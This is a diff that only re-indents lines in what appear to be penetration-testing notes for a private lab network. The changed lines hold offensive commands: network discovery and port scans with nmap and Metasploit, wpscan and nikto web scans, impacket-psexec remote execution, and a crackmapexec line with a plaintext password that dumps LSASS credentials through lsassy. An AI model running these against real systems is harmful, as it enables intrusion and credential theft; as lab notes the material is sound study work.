@@ -76,7 +76,7 @@ Mimikatz:
 
 Impacket:
 
-impacket-psexec monica.garfield@10.10.30.11
+	impacket-psexec monica.garfield@10.10.30.11
 
 
 DNS Recon
@@ -104,20 +104,20 @@ Internal Recon
 --------------
 
 Discovery:
-nmap -sn 10.10.10.0/24 > internal
-nmap -sn 10.10.30.0/24 >> internal
-cat internal | grep report | cut -d " " -f 5 > internal.ips
+	nmap -sn 10.10.10.0/24 > internal
+	nmap -sn 10.10.30.0/24 >> internal
+	cat internal | grep report | cut -d " " -f 5 > internal.ips
 
 Port scans:
 
-nmap -iL internal.ips --top-ports=1000 --open -oN internal-top-ports.nmap
+	nmap -iL internal.ips --top-ports=1000 --open -oN internal-top-ports.nmap
 
 With Metasploit:
 
-msfdb init
-msfconsole
-db_nmap 10.10.10.0/24 -p-
-db_nmap 10.10.30.0/24 -p-
+	msfdb init
+	msfconsole
+	db_nmap 10.10.10.0/24 -p-
+	db_nmap 10.10.30.0/24 -p-
 
 
 Interesting Services:
@@ -181,7 +181,7 @@ Windows Post Exploitation:
 
 Commands:
 
-wpscan --url http://10.10.10.9:31337
-nikto -host 10.10.10.13 -port 55555
+	wpscan --url http://10.10.10.9:31337
+	nikto -host 10.10.10.13 -port 55555
 
- crackmapexec smb 10.10.30.11 -u monica.garfield -p tinkerbell -M lsassy
+ 	crackmapexec smb 10.10.30.11 -u monica.garfield -p tinkerbell -M lsassy
